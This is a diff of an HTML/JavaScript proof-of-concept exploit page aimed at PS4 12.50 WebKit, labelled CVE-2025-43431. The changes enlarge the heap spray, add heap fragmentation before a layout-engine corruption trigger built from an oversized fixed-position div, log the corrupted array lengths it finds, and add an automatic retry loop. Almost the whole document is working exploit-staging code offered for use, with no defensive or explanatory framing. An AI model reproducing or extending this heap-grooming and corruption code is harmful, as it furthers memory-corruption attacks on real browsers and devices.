@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ps4 12.50 webkit rce (interactive PoC)</title>
+    <title>PS4 12.50 WebKit RCE (Improved Debug PoC)</title>
     <style>
         body { background:#0d1117; color:#c9d1d9; font-family:monospace; font-size:14px; }
         #log { background:#000; border:1px solid #333; height:400px; overflow-y:scroll; padding:10px; margin-bottom:10px; white-space:pre-wrap; }
@@ -9,14 +9,16 @@
         button:disabled { background:#555; }
         .error { color: #ff5555; }
         .success { color: #55ff55; }
+        .info { color: #9999ff; }
     </style>
 </head>
 <body>
-    <h1>interactive PoC - cve-2025-43431</h1>
+    <h1>Interactive PoC - CVE-2025-43431 (Enhanced Spray & Debug)</h1>
     <div id="controls">
-        <button id="btn_groom" onclick="run_stage1()">1. groom heap</button>
-        <button id="btn_trigger" onclick="run_stage2()" disabled>2. trigger corruption</button>
-        <button id="btn_hunt" onclick="run_stage3()" disabled>3. hunt for victim</button>
+        <button id="btn_groom" onclick="run_stage1()">1. Groom Heap</button>
+        <button id="btn_trigger" onclick="run_stage2()" disabled>2. Trigger Corruption</button>
+        <button id="btn_hunt" onclick="run_stage3()" disabled>3. Hunt Victim</button>
+        <button id="btn_auto" onclick="auto_mode()" disabled>4. Auto Loop</button>
     </div>
     <pre id="log"></pre>
 <script>
@@ -27,72 +29,107 @@ const log = (msg, type = '') => {
 };
 
 let victim_spray = [];
-let corrupted_primitives = null;
+let corruption_attempts = 0;
 
 function run_stage1() {
     try {
-        log("stage 1: grooming heap with 0x4000 victim pairs...");
-        for (let i = 0; i < 0x4000; i++) {
-            victim_spray[i] = [new Float64Array(1), [{}]]
+        victim_spray = [];
+        log("Stage 1: Grooming heap with mixed victim objects...", "info");
+
+        for (let i = 0; i < 0x8000; i++) {
+            victim_spray[i] = [
+                new Float64Array(8),         // Float spray
+                new Uint32Array(16),         // Uint spray
+                { filler: "A".repeat(64) }   // Plain object padding
+            ];
         }
-        log("grooming complete. heap is prepped.", "success");
+
+        log("Heap spray complete: " + victim_spray.length + " objects placed.", "success");
+
         document.getElementById('btn_groom').disabled = true;
         document.getElementById('btn_trigger').disabled = false;
+        document.getElementById('btn_auto').disabled = false;
     } catch (e) {
-        log(`stage 1 failed: ${e.message}`, "error");
+        log(`Stage 1 failed: ${e.message}`, "error");
     }
 }
 
 function run_stage2() {
     try {
-        log("stage 2: triggering layout engine corruption (cve-2025-43431)...");
+        log("Stage 2: Triggering layout engine corruption...", "info");
+
+        // Fragment heap before trigger
+        let junk = [];
+        for (let j = 0; j < 2000; j++) {
+            junk.push(new ArrayBuffer(0x2000));
+        }
+
         const div = document.createElement('div');
         div.style.cssText = `width: ${Math.pow(2, 31) - 1}px; height: ${Math.pow(2, 31) - 1}px; position: fixed;`;
         document.body.appendChild(div);
-        div.offsetWidth; // Force reflow
-        log("trigger sent. if browser hasn't crashed, proceed to hunt.", "success");
+        div.offsetWidth;
+
+        log("Corruption trigger sent.", "success");
         document.getElementById('btn_trigger').disabled = true;
         document.getElementById('btn_hunt').disabled = false;
     } catch (e) {
-        log(`stage 2 failed: ${e.message}`, "error");
+        log(`Stage 2 failed: ${e.message}`, "error");
     }
 }
 
 function run_stage3() {
     try {
-        log("stage 3: hunting for corrupted array...");
+        corruption_attempts++;
+        log(`Stage 3: Hunting corrupted arrays (Attempt ${corruption_attempts})...`, "info");
+
         let found = false;
+        let lengths = [];
+
         for (let i = 0; i < victim_spray.length; i++) {
-            // Check if the object is still valid before accessing properties
             if (!victim_spray[i] || !victim_spray[i][0]) continue;
-            
-            let arr_len = 0;
+            let len = 0;
             try {
-                arr_len = victim_spray[i][0].length;
+                len = victim_spray[i][0].length;
             } catch(e) {
-                log(`error accessing length at index ${i}: ${e.message}`, "error");
+                log(`Error at index ${i}: ${e.message}`, "error");
                 continue;
             }
 
-            if (arr_len > 1) {
-                log(`!!! VICTIM FOUND at index ${i} !!!`, "success");
-                log(`corrupted length: ${arr_len}`, "success");
+            lengths.push(len);
+            if (len > 8) {
+                log(`!!! VICTIM FOUND at index ${i} | Length: ${len} !!!`, "success");
                 found = true;
-                // In a real scenario, we'd now build primitives here.
-                // For now, we just confirm we found it.
-                alert("CORRUPTION SUCCESSFUL! Check logs for details.");
+                alert("CORRUPTION SUCCESSFUL! See logs.");
                 break;
             }
         }
+
+        log("Length distribution snapshot: " + JSON.stringify(lengths.slice(0,50)) + (lengths.length > 50 ? "..." : ""), "info");
+
         if (!found) {
-            log("hunt failed. no corrupted array found. heap was uncooperative.", "error");
-            alert("Exploit failed. Refresh and try again.");
+            log("No victim found this round.", "error");
         }
+        document.getElementById('btn_trigger').disabled = false;
         document.getElementById('btn_hunt').disabled = true;
+
     } catch (e) {
-        log(`stage 3 failed: ${e.message}`, "error");
+        log(`Stage 3 failed: ${e.message}`, "error");
     }
 }
+
+function auto_mode() {
+    let runs = 10;
+    const loop = (i) => {
+        if (i >= runs) return;
+        run_stage2();
+        setTimeout(() => {
+            run_stage3();
+            setTimeout(() => loop(i+1), 300);
+        }, 300);
+    };
+    loop(0);
+}
+
 </script>
 </body>
 </html>
